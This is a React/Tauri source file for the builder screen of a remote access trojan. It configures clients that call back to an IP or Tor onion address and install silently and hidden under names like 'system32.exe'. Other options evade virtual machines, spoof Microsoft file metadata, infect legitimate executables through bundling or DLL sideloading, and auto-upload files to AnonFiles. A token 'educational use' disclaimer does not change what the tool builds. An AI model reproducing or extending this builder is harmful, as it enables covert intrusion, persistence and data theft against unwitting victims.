import { useContext, useEffect, useState } from "react";
import { open } from "@tauri-apps/plugin-dialog";
import {
  IconBell,
  IconBellOff,
  IconServerCog,
  IconLock,
  IconClipboardText,
  IconInfoCircle,
  IconPhoto,
  IconAlertCircle,
  IconArrowRight,
  IconArrowLeft,
  IconFileCode,
  IconFileSettings,
  IconFolder,
  IconToggleRight,
  IconToggleLeft,
  IconDashboard,
  IconSettings,
  IconCodeCircle,
  IconEyeglassOff,
  IconEyeClosed,
  IconWifi,
  IconCloudPlus,
  IconRefresh,
} from "@tabler/icons-react";

import { RATContext } from "../rat/RATContext";
import { AssemblyInfo, OnionServiceInfo } from "../../types";
import { invoke } from "@tauri-apps/api/core";
import { buildClientCmd, buildInfectedClientCmd, createOnionCmd, initTorCmd, setAutoUploadAnonFilesCmd } from "../rat/RATCommands";

export const Settings = () => {
  const { setNotificationClient, notificationClient, autoUploadAnonFiles, setAutoUploadAnonFiles } = useContext(RATContext)!;

  const [currentStep, setCurrentStep] = useState(0);
  const [buildMode, setBuildMode] = useState<"normal" | "infect">("normal");
  const [enableIcon, setEnableIcon] = useState(false);

  const [buildIp, setBuildIp] = useState<string>("127.0.0.1");
  const [buildPort, setBuildPort] = useState<string>("1337");
  const [useTor, setUseTor] = useState<boolean>(false);
  const [torAddress, setTorAddress] = useState<string>("");

  const [installFileName, setInstallFileName] = useState<string>("");
  const [installFolder, setInstallFolder] = useState<string>("appdata");
  const [enableInstall, setEnableInstall] = useState(false);
  const [enableHidden, setEnableHidden] = useState(false);
  const [enableUnattended, setEnableUnattended] = useState(false);

  const [group, setGroup] = useState<string>("Default");
  const [processCritical, _setProcessCritical] = useState(false);
  const [enableMutex, setEnableMutex] = useState(false);
  const [mutexName, setMutexName] = useState<string>("");
  // const [attemptUacBypass, setAttemptUacBypass] = useState(false);
  const [antiVmDetection, setAntiVmDetection] = useState(false);

  const [assemblyInfo, setAssemblyInfo] = useState<AssemblyInfo>({
    assembly_name: "",
    assembly_description: "",
    assembly_company: "",
    assembly_copyright: "",
    assembly_trademarks: "",
    assembly_original_filename: "",
    assembly_product_version: "",
    assembly_file_version: "",
  });

  const [iconPath, setIconPath] = useState<string>("");
  const [exeClonePath, setExeClonePath] = useState<string>("");

  const [iconData, setIconData] = useState<string>("");

  const [dllName, setDllName] = useState<string>("version.dll");
  const [hostExePath, setHostExePath] = useState<string>("");
  const [isRandomDll, setIsRandomDll] = useState<boolean>(false);
  const [infectionMethod, setInfectionMethod] = useState<"single" | "sideload">("single");

  const [onionServices, setOnionServices] = useState<OnionServiceInfo[]>([]);
  const [isInitializingTor, setIsInitializingTor] = useState(false);

  const commonDlls = [
    "version.dll",
    "uxtheme.dll",
    "winmm.dll",
    "shcore.dll",
    "msimg32.dll",
    "cryptbase.dll",
    "dnsapi.dll",
    "winspool.drv"
  ];

  useEffect(() => {
    initTorCmd()
      .then(setOnionServices)
      .catch((e) => {
        console.error("Failed to initialize Tor services", e);
        setOnionServices([]);
      });
  }, []);

  const handleCreateOnion = async () => {
    const parsedPort = parseInt(buildPort, 10);
    if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
      console.error("Invalid server port for onion creation");
      return;
    }

    setIsInitializingTor(true);
    try {
      const newOnion = await createOnionCmd(`onion-${Date.now()}`, parsedPort);
      setOnionServices((prev) => [...prev, newOnion]);
      setTorAddress(newOnion.onion_address);
      setUseTor(true);
    } catch (e) {
      console.error(e);
    } finally {
      setIsInitializingTor(false);
    }
  };

  useEffect(() => {
    if (iconPath) {
      invoke("read_icon", { path: iconPath }).then((data) => {
        setIconData(data as string);
      });
    }
  }, [iconPath]);

  useEffect(() => {
    if (exeClonePath) {
      invoke("read_exe", { path: exeClonePath }).then((data) => {
        setAssemblyInfo(data as AssemblyInfo);
      });
    }
  }, [exeClonePath]);

  const baseSteps = [
    { name: "Connection", icon: <IconServerCog /> },
    { name: "Tor", icon: <IconWifi /> },
    { name: "Install", icon: <IconFolder /> },
    { name: "Misc", icon: <IconSettings /> },
    { name: "Assembly", icon: <IconCodeCircle /> },
    { name: "Icon", icon: <IconPhoto /> },
  ];

  const infectSteps = [
    ...baseSteps,
    { name: "Infect", icon: <IconFileSettings /> },
  ];

  const steps = buildMode === "normal" ? baseSteps : infectSteps;

  return (
    <div className="flex flex-col h-full w-full bg-primarybg text-white">
      <div className="flex flex-1 overflow-hidden">
        <div className="w-1/3 overflow-auto">
          <div className="space-y-6">
            <div className="bg-secondarybg rounded-xl p-4">
              <h2 className="text-xl font-semibold mb-4 flex items-center">
                <IconDashboard className="mr-2" size={20} />
                Server Settings
              </h2>

              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    {notificationClient ? (
                      <IconBell className="mr-2 text-blue-400" size={20} />
                    ) : (
                      <IconBellOff className="mr-2 text-gray-400" size={20} />
                    )}
                    <span>Client Notifications</span>
                  </div>
                  <button
                    onClick={() => setNotificationClient(!notificationClient)}
                    className={`p-1 rounded-lg cursor-pointer ${
                      notificationClient ? "bg-blue-700" : "bg-gray-700"
                    }`}
                  >
                    {notificationClient ? (
                      <IconToggleRight size={24} />
                    ) : (
                      <IconToggleLeft size={24} />
                    )}
                  </button>
                </div>

                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    {autoUploadAnonFiles ? (
                      <IconCloudPlus className="mr-2 text-green-400" size={20} />
                    ) : (
                      <IconCloudPlus className="mr-2 text-gray-400" size={20} />
                    )}
                    <span>AnonFiles Auto-Upload</span>
                  </div>
                  <button
                    onClick={() => {
                      setAutoUploadAnonFiles(!autoUploadAnonFiles);
                      setAutoUploadAnonFilesCmd(!autoUploadAnonFiles);
                    }}
                    className={`p-1 rounded-lg cursor-pointer ${
                      autoUploadAnonFiles ? "bg-green-700" : "bg-gray-700"
                    }`}
                  >
                    {autoUploadAnonFiles ? (
                      <IconToggleRight size={24} />
                    ) : (
                      <IconToggleLeft size={24} />
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="w-2/3 pl-4 overflow-auto">
          <div className="bg-secondarybg rounded-xl p-4 h-full flex flex-col">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-semibold flex items-center">
                <IconFileSettings className="mr-2" size={20} />
                Client Builder
              </h2>
              <div className="flex bg-primarybg rounded-lg p-1">
                <button
                  onClick={() => {
                    setBuildMode("normal");
                    if (currentStep > 5) setCurrentStep(5);
                  }}
                  className={`px-3 py-1 rounded-md text-sm transition-all ${
                    buildMode === "normal"
                      ? "bg-blue-700 text-white"
                      : "text-gray-400 hover:text-white"
                  }`}
                >
                  Normal
                </button>
                <button
                  onClick={() => setBuildMode("infect")}
                  className={`px-3 py-1 rounded-md text-sm transition-all ${
                    buildMode === "infect"
                      ? "bg-blue-700 text-white"
                      : "text-gray-400 hover:text-white"
                  }`}
                >
                  Infect
                </button>
              </div>
            </div>

            <div
              className={`flex justify-between px-4 pt-2 ${
                currentStep === steps.length ? "pb-0" : "pb-8"
              }`}
            >
              {currentStep < steps.length &&
                steps.map((step, index) => (
                  <div key={step.name} className="flex flex-col items-center">
                    <div
                      className={`flex items-center justify-center w-10 h-10 rounded-full border-2 
                      ${
                        index === currentStep
                          ? "bg-blue-700 border-blue-500"
                          : index < currentStep
                          ? "bg-green-700 border-green-500"
                          : "bg-gray-800 border-gray-600"
                      }`}
                    >
                      {step.icon}
                    </div>
                    <div className="text-xs mt-2">{step.name}</div>
                  </div>
                ))}
            </div>

            <div className="flex-1 overflow-auto px-4">
              {currentStep === 0 && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Connection Settings</h3>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">Server IP</label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="e.g. 192.168.1.100"
                        value={buildIp}
                        onChange={(e) => setBuildIp(e.target.value)}
                      />
                    </div>
                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        Server Port
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="e.g. 1337"
                        value={buildPort}
                        onChange={(e) => setBuildPort(e.target.value)}
                      />
                    </div>
                  </div>
                </div>
              )}

              {currentStep === 1 && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Tor Settings</h3>

                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center">
                      <IconWifi className="mr-2 text-purple-400" size={20} />
                      <span>Use Tor (NAT Penetration)</span>
                    </div>
                    <button
                      onClick={() => setUseTor(!useTor)}
                      className={`p-1 rounded-lg cursor-pointer ${
                        useTor ? "bg-blue-700" : "bg-gray-700"
                      }`}
                    >
                      {useTor ? (
                        <IconToggleRight size={24} />
                      ) : (
                        <IconToggleLeft size={24} />
                      )}
                    </button>
                  </div>

                  {useTor && (
                    <div className="space-y-4 pl-4 border-l-2 border-purple-600">
                      <div className="flex flex-col space-y-2">
                        <label className="text-sm text-gray-400">
                          Onion Address
                        </label>
                        <div className="flex space-x-2">
                          <select
                            className="flex-1 bg-primarybg border border-accentx rounded-lg p-2 text-white"
                            value={torAddress}
                            onChange={(e) => setTorAddress(e.target.value)}
                          >
                            <option value="">Select an onion address</option>
                            {onionServices.map((s) => (
                              <option key={s.nickname} value={s.onion_address}>
                                {s.nickname} ({s.onion_address})
                              </option>
                            ))}
                          </select>
                          <button
                            onClick={handleCreateOnion}
                            disabled={isInitializingTor}
                            className="bg-blue-700 hover:bg-blue-600 p-2 rounded-lg disabled:opacity-50"
                            title="Generate New Onion"
                          >
                            {isInitializingTor ? (
                              <IconRefresh className="animate-spin" size={20} />
                            ) : (
                              <IconCloudPlus size={20} />
                            )}
                          </button>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {currentStep === 2 && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Installation Options</h3>

                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center">
                      <IconFolder className="mr-2 text-yellow-400" size={20} />
                      <span>Install Client</span>
                    </div>
                    <button
                      onClick={() => setEnableInstall(!enableInstall)}
                      className={`p-1 rounded-lg cursor-pointer ${
                        enableInstall ? "bg-blue-700" : "bg-gray-700"
                      }`}
                    >
                      {enableInstall ? (
                        <IconToggleRight size={24} />
                      ) : (
                        <IconToggleLeft size={24} />
                      )}
                    </button>
                  </div>

                  {enableInstall && (
                    <div className="space-y-4 pl-4 border-l-2 border-yellow-600">
                      <div className="flex flex-col space-y-2">
                        <label className="text-sm text-gray-400">
                          File Name
                        </label>
                        <input
                          type="text"
                          className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                          placeholder="e.g. system32.exe"
                          value={installFileName}
                          onChange={(e) => setInstallFileName(e.target.value)}
                        />
                      </div>

                      <div className="flex flex-col space-y-2">
                        <label className="text-sm text-gray-400">
                          Install Folder
                        </label>
                        <select
                          className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                          value={installFolder}
                          onChange={(e) => setInstallFolder(e.target.value)}
                        >
                          <option value="appdata">AppData</option>
                          <option value="programfiles">Program Files</option>
                          <option value="temp">Temp Directory</option>
                          <option value="system">System32</option>
                          <option value="desktop">Desktop</option>
                        </select>
                      </div>

                      <div className="flex items-center justify-between mb-4">
                        <div className="flex items-center">
                          <IconEyeClosed
                            className="mr-2 text-yellow-400"
                            size={20}
                          />
                          <span>Hidden file attribute</span>
                        </div>
                        <button
                          onClick={() => setEnableHidden(!enableHidden)}
                          className={`p-1 rounded-lg cursor-pointer ${
                            enableHidden ? "bg-blue-700" : "bg-gray-700"
                          }`}
                        >
                          {enableHidden ? (
                            <IconToggleRight size={24} />
                          ) : (
                            <IconToggleLeft size={24} />
                          )}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {currentStep === 3 && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">
                    Miscellaneous Settings
                  </h3>

                  <div className="grid grid-cols-1 gap-4">
                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">Group</label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="Default"
                        value={group}
                        onChange={(e) => setGroup(e.target.value)}
                      />
                    </div>
                  </div>

                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center">
                      <IconLock className="mr-2 text-purple-400" size={20} />
                      <span>Enable Mutex</span>
                    </div>
                    <button
                      onClick={() => setEnableMutex(!enableMutex)}
                      className={`p-1 rounded-lg cursor-pointer ${
                        enableMutex ? "bg-blue-700" : "bg-gray-700"
                      }`}
                    >
                      {enableMutex ? (
                        <IconToggleRight size={24} />
                      ) : (
                        <IconToggleLeft size={24} />
                      )}
                    </button>
                  </div>

                  {enableMutex && (
                    <div className="flex flex-col space-y-2 pl-4 border-l-2 border-purple-600">
                      <label className="text-sm text-gray-400">
                        Mutex Name
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="MyClientMutex"
                        value={mutexName}
                        onChange={(e) => setMutexName(e.target.value)}
                      />
                    </div>
                  )}

                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center">
                      <IconEyeglassOff
                        className="mr-2 text-teal-400"
                        size={20}
                      />
                      <span>Anti-VM Detection</span>
                    </div>
                    <button
                      onClick={() => setAntiVmDetection(!antiVmDetection)}
                      className={`p-1 rounded-lg cursor-pointer ${
                        antiVmDetection ? "bg-blue-700" : "bg-gray-700"
                      }`}
                    >
                      {antiVmDetection ? (
                        <IconToggleRight size={24} />
                      ) : (
                        <IconToggleLeft size={24} />
                      )}
                    </button>
                  </div>
                </div>
              )}

              {currentStep === 4 && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Assembly Information</h3>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        Product Name
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="My Application"
                        value={assemblyInfo.assembly_name}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_name: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        Description
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="System Application"
                        value={assemblyInfo.assembly_description}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_description: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">Company</label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="Microsoft Corporation"
                        value={assemblyInfo.assembly_company}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_company: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">Copyright</label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="© 2023"
                        value={assemblyInfo.assembly_copyright}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_copyright: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        Trademarks
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="Microsoft Trademark"
                        value={assemblyInfo.assembly_trademarks}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_trademarks: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        Original Filename
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="system.exe"
                        value={assemblyInfo.assembly_original_filename}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_original_filename: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        Product Version
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="1.0.0.0"
                        value={assemblyInfo.assembly_product_version}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_product_version: e.target.value,
                          })
                        }
                      />
                    </div>

                    <div className="flex flex-col space-y-2">
                      <label className="text-sm text-gray-400">
                        File Version
                      </label>
                      <input
                        type="text"
                        className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
                        placeholder="1.0.0.0"
                        value={assemblyInfo.assembly_file_version}
                        onChange={(e) =>
                          setAssemblyInfo({
                            ...assemblyInfo,
                            assembly_file_version: e.target.value,
                          })
                        }
                      />
                    </div>
                  </div>

                  <button
                    onClick={() => {
                      open({
                        filters: [
                          {
                            name: "Executable File",
                            extensions: ["exe"],
                          },
                        ],
                      }).then((path) => {
                        if (path) {
                          setExeClonePath(path as string);
                        }
                      });
                    }}
                    className="mt-4 cursor-pointer bg-purple-700 hover:bg-purple-600 text-white py-2 px-4 rounded-lg flex items-center"
                  >
                    <IconClipboardText className="mr-2" size={20} />
                    Clone Existing Application
                  </button>
                </div>
              )}

              {currentStep === 5 && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Icon Settings</h3>

                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center">
                      <IconPhoto className="mr-2 text-blue-400" size={20} />
                      <span>Custom Icon</span>
                    </div>
                    <button
                      onClick={() => setEnableIcon(!enableIcon)}
                      className={`p-1 rounded-lg cursor-pointer ${
                        enableIcon ? "bg-blue-700" : "bg-gray-700"
                      }`}
                    >
                      {enableIcon ? (
                        <IconToggleRight size={24} />
                      ) : (
                        <IconToggleLeft size={24} />
                      )}
                    </button>
                  </div>

                  {enableIcon && (
                    <div className="space-y-4 pl-4 border-l-2 border-blue-600">
                      <button
                        className="cursor-pointer bg-accentx hover:bg-gray-600 text-white py-2 px-4 rounded-lg flex items-center"
                        onClick={() => {
                          open({
                            filters: [
                              {
                                name: "Icon File",
                                extensions: ["ico"],
                              },
                            ],
                          }).then((path) => {
                            if (path) {
                              setIconPath(path as string);
                            }
                          });
                        }}
                      >
                        <IconFolder className="mr-2" size={20} />
                        Browse Icon File
                      </button>

                      {iconPath ? (
                        <div className="bg-primarybg rounded-lg p-6 flex items-center justify-center">
                          <div className="w-32 h-32 bg-gray-800 rounded-lg flex items-center justify-center animate-pulse">
                            <img
                              src={`data:image/x-icon;base64,${iconData}`}
                              alt="Icon"
                              className="w-full h-full object-contain"
                            />
                          </div>
                        </div>
                      ) : (
                        <div className="bg-primarybg rounded-lg p-6 flex items-center justify-center">
                          <div className="w-32 h-32 bg-gray-800 rounded-lg flex items-center justify-center animate-pulse">
                            <IconPhoto size={48} className="text-gray-600" />
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}

              {currentStep === 6 && buildMode === "infect" && (
                <div className="space-y-4">
                  <h3 className="text-lg font-medium">Infection Settings</h3>

                  <div className="bg-primarybg/50 rounded-xl p-4 border border-accentx/30 mb-4">
                     <label className="text-sm text-gray-400 mb-2 block">Infection Method</label>
                     <div className="flex bg-secondarybg rounded-lg p-1 w-fit">
                        <button
                          onClick={() => setInfectionMethod("single")}
                          className={`px-4 py-1.5 rounded-md text-sm transition-all ${
                            infectionMethod === "single"
                              ? "bg-blue-700 text-white shadow-lg"
                              : "text-gray-400 hover:text-white"
                          }`}
                        >
                          Single File (Bundled)
                        </button>
                        <button
                          onClick={() => setInfectionMethod("sideload")}
                          className={`px-4 py-1.5 rounded-md text-sm transition-all ${
                            infectionMethod === "sideload"
                              ? "bg-blue-700 text-white shadow-lg"
                              : "text-gray-400 hover:text-white"
                          }`}
                        >
                          Sideload (2 Files)
                        </button>
                     </div>
                     <p className="text-xs text-gray-500 mt-2">
                        {infectionMethod === "single"
                          ? "Creates a single .exe that contains both the host and the client. Stealthier."
                          : "Extracts the host and a spoofed DLL. Higher compatibility."}
                     </p>
                  </div>

                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center">
                      <IconCodeCircle className="mr-2 text-purple-400" size={20} />
                      <span>Randomized DLL Name</span>
                    </div>
                    <button
                      onClick={() => setIsRandomDll(!isRandomDll)}
                      className={`p-1 rounded-lg cursor-pointer ${
                        isRandomDll ? "bg-blue-700" : "bg-gray-700"
                      }`}
                    >
                      {isRandomDll ? (
                        <IconToggleRight size={24} />
                      ) : (
                        <IconToggleLeft size={24} />
                      )}
                    </button>
                  </div>

                  {!isRandomDll && (
                    <div className="flex flex-col space-y-2 pl-4 border-l-2 border-purple-600">
                      <label className="text-sm text-gray-400">Loader DLL Name</label>
                      <div className="flex gap-2">
                        <select
                          className="bg-primarybg border border-accentx rounded-lg p-2 text-white flex-1"
                          value={dllName}
                          onChange={(e) => setDllName(e.target.value)}
                        >
                          {commonDlls.map(dll => (
                            <option key={dll} value={dll}>{dll}</option>
                          ))}
                          <option value="custom">-- Custom --</option>
                        </select>
                        { (dllName === "custom" || !commonDlls.includes(dllName)) && (
                           <input
                            type="text"
                            className="bg-primarybg border border-accentx rounded-lg p-2 text-white flex-1"
                            placeholder="e.g. system.dll"
                            value={dllName === "custom" ? "" : dllName}
                            onChange={(e) => setDllName(e.target.value)}
                          />
                        )}
                      </div>
                    </div>
                  )}

                  <div className="mt-6">
                    <label className="text-sm text-gray-400 mb-2 block">Host Executable (to be infected)</label>
                    <div
                      className="border-2 border-dashed border-gray-600 rounded-xl p-8 flex flex-col items-center justify-center bg-black/20 hover:border-blue-500 transition-colors cursor-pointer"
                      onClick={() => {
                        open({
                          filters: [
                            {
                              name: "Executable File",
                              extensions: ["exe"],
                            },
                          ],
                        }).then((path) => {
                          if (path) {
                            setHostExePath(path as string);
                          }
                        });
                      }}
                    >
                      <IconFileCode size={48} className="text-gray-500 mb-2" />
                      <p className="text-gray-300 text-center">
                        {hostExePath ? (
                          <span className="text-blue-400 font-medium">{hostExePath.split(/[\\/]/).pop()}</span>
                        ) : (
                          "Select Host EXE"
                        )}
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {currentStep === (buildMode === "normal" ? 6 : 7) && (
                <div className="space-y-6">
                  <div className="bg-black/30 rounded-xl p-4 mb-6">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center">
                        <IconEyeClosed
                          className="mr-2 text-blue-400"
                          size={24}
                        />
                        <span className="text-lg">Unattended Mode</span>
                      </div>
                      <button
                        onClick={() => setEnableUnattended(!enableUnattended)}
                        className={`p-1 rounded-lg cursor-pointer ${
                          enableUnattended ? "bg-blue-700" : "bg-gray-700"
                        }`}
                      >
                        {enableUnattended ? (
                          <IconToggleRight size={24} />
                        ) : (
                          <IconToggleLeft size={24} />
                        )}
                      </button>
                    </div>

                    {enableUnattended && (
                      <div className="text-sm text-gray-300 pl-8 pt-1">
                        Unattended mode will silently install and run the client
                        without any user interaction or prompts.
                      </div>
                    )}
                  </div>

                  <div className="bg-red-950/30 border border-red-800/50 rounded-xl p-6">
                    <h4 className="text-lg font-medium flex items-center text-red-300 mb-3">
                      <IconAlertCircle className="mr-2" size={24} />
                      Disclaimer
                    </h4>
                    <div className="text-gray-300 space-y-2">
                      <p>
                        This software is intended for educational and authorized
                        remote administration purposes only.
                      </p>
                      <p>By clicking "Build Client", you confirm that:</p>
                      <ul className="list-disc pl-5 space-y-1">
                        <li>
                          You will only use this tool on systems you own or have
                          explicit permission to access
                        </li>
                        <li>
                          You understand that unauthorized access to computer
                          systems is illegal and unethical
                        </li>
                        <li>
                          You accept full responsibility for any consequences
                          resulting from misuse of this software
                        </li>
                      </ul>
                    </div>
                  </div>

                  <div className="bg-blue-950/30 border border-blue-800/50 rounded-xl p-6 mt-4">
                    <h4 className="text-lg font-medium flex items-center text-blue-300 mb-3">
                      <IconInfoCircle className="mr-2" size={24} />
                      Client Summary
                    </h4>
                    <div className="text-white space-y-1 text-sm">
                      <p>
                        <span className="text-gray-400">Connection:</span>{" "}
                        {useTor ? torAddress : `${buildIp}:${buildPort}`}
                        {useTor && (
                          <span className="text-xs text-purple-400 ml-2">
                            (Tor Enabled)
                          </span>
                        )}
                      </p>
                      {enableInstall && (
                        <p>
                          <span className="text-gray-400">Install:</span>{" "}
                          {installFileName} in {installFolder}{" "}
                          {enableHidden ? "(Hidden)" : ""}
                        </p>
                      )}
                      <p>
                        <span className="text-gray-400">Group:</span>{" "}
                        {group || "Default"}
                      </p>
                      {processCritical && (
                        <p>
                          <span className="text-gray-400">Process:</span>{" "}
                          Critical
                        </p>
                      )}
                      {enableMutex && (
                        <p>
                          <span className="text-gray-400">Mutex:</span>{" "}
                          {mutexName}
                        </p>
                      )}
                      {assemblyInfo.assembly_name && (
                        <p>
                          <span className="text-gray-400">Product:</span>{" "}
                          {assemblyInfo.assembly_name}
                        </p>
                      )}
                      {enableIcon && (
                        <p>
                          <span className="text-gray-400">Custom Icon:</span>{" "}
                          Enabled
                        </p>
                      )}
                      {enableUnattended && (
                        <p>
                          <span className="text-gray-400">Mode:</span>{" "}
                          Unattended
                        </p>
                      )}
                      {buildMode === "infect" && (
                        <>
                          <p>
                            <span className="text-gray-400">Build Mode:</span>{" "}
                            Infect ({infectionMethod === "single" ? "Single File" : "Sideload"})
                          </p>
                          <p>
                            <span className="text-gray-400">DLL Name:</span>{" "}
                            {isRandomDll ? "Randomized" : dllName}
                          </p>
                          <p>
                            <span className="text-gray-400">Host EXE:</span>{" "}
                            {hostExePath ? hostExePath.split(/[\\/]/).pop() : "Not Selected"}
                          </p>
                        </>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>

            <div className="flex justify-between mt-6 pt-4 border-t border-accentx">
              <button
                onClick={() => setCurrentStep((prev) => Math.max(0, prev - 1))}
                disabled={currentStep === 0}
                className={`cursor-pointer flex items-center py-2 px-4 rounded-lg ${
                  currentStep === 0
                    ? "bg-gray-800 text-gray-500 cursor-not-allowed"
                    : "bg-accentx hover:bg-gray-600 text-white"
                }`}
              >
                <IconArrowLeft className="mr-2" size={20} />
                Previous
              </button>

              {currentStep < steps.length ? (
                <button
                  onClick={() =>
                    setCurrentStep((prev) => Math.min(steps.length, prev + 1))
                  }
                  className="cursor-pointer bg-blue-700 hover:bg-blue-600 text-white py-2 px-4 rounded-lg flex items-center"
                >
                  Next
                  <IconArrowRight className="ml-2" size={20} />
                </button>
              ) : (
                <button
                  className="cursor-pointer bg-green-700 hover:bg-green-600 text-white py-2 px-4 rounded-lg flex items-center"
                  onClick={() => {
                    if (useTor && !torAddress) {
                      console.error(
                        "Select or create an onion address before building with Tor."
                      );
                      return;
                    }

                    if (buildMode === "infect") {
                      if (!hostExePath) {
                        console.error("Please select a host executable to infect.");
                        return;
                      }
                      buildInfectedClientCmd(
                        buildIp,
                        buildPort,
                        enableMutex,
                        mutexName,
                        enableUnattended,
                        assemblyInfo,
                        enableIcon,
                        iconPath,
                        enableInstall,
                        installFolder,
                        installFileName,
                        group,
                        enableHidden,
                        antiVmDetection,
                        useTor,
                        torAddress,
                        isRandomDll ? "" : dllName,
                          hostExePath,
                          infectionMethod
                      );
                    } else {
                      buildClientCmd(
                        buildIp,
                        buildPort,
                        enableMutex,
                        mutexName,
                        enableUnattended,
                        assemblyInfo,
                        enableIcon,
                        iconPath,
                        enableInstall,
                        installFolder,
                        installFileName,
                        group,
                        enableHidden,
                        antiVmDetection,
                        useTor,
                        torAddress
                      );
                    }
                  }}
                >
                  {buildMode === "infect" ? "Infect & Build" : "Build Client"}
                  <IconFileCode className="ml-2" size={20} />
                </button>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
